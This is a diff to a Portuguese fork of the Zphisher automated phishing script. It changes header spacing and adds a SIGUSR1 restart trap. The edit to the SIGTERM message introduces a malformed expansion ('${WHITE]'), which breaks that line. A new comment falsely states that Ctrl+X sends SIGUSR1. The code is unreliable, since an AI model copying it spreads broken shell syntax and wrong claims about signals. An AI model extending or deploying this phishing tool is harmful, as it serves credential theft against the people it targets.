@@ -1,9 +1,9 @@
 #!/bin/bash
 
-##   Zphisher 	: 	Ferramenta de Phishing Automatizada
-##   Author 	: 	Tranecck
-##   Version 	: 	2.3.5
-##   Github 	: 	https://github.com/htr-tech/zphisher
+##   Zphisher  :   Ferramenta de Phishing Automatizada
+##   Author    :   Tranecck
+##   Version   :   2.3.5
+##   Github    :   https://github.com/htr-tech/zphisher
 
 
 ##                   GNU GENERAL PUBLIC LICENSE
@@ -16,7 +16,7 @@ __version__="2.3.5"
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
-PORT='8080' 
+PORT='8080'
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -52,6 +52,15 @@ if [[ -e ".server/.cld.log" ]]; then
 	rm -rf ".server/.cld.log"
 fi
 
+## Função para reiniciar o script
+restart_on_signal_SIGUSR1() {
+    { printf "\n\n%s\n\n" "${GREEN}[${WHITE}+${GREEN}]${CYAN} Reiniciando o script...${WHITE}" 2>&1; }
+    exec "$0" # Reinicia o script
+}
+
+# Captura o sinal de Ctrl + X (SIGUSR1)
+trap restart_on_signal_SIGUSR1 SIGUSR1
+
 ## Script termination
 exit_on_signal_SIGINT() {
 	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Interrompido." 2>&1; reset_color; }
@@ -59,7 +68,7 @@ exit_on_signal_SIGINT() {
 }
 
 exit_on_signal_SIGTERM() {
-	{ printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Programa Encerrado." 2>&1; reset_color; }
+	{ printf "\n\n%s\n\n" "${RED}[${WHITE]!${RED}]${RED} Programa Encerrado." 2>&1; reset_color; }
 	exit 0
 }
 
@@ -811,7 +820,7 @@ main_menu() {
 			tunnel_menu;;
 		99)
 			about;;
-		0 | 00 )
+		0 | 00)
 			msg_exit;;
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
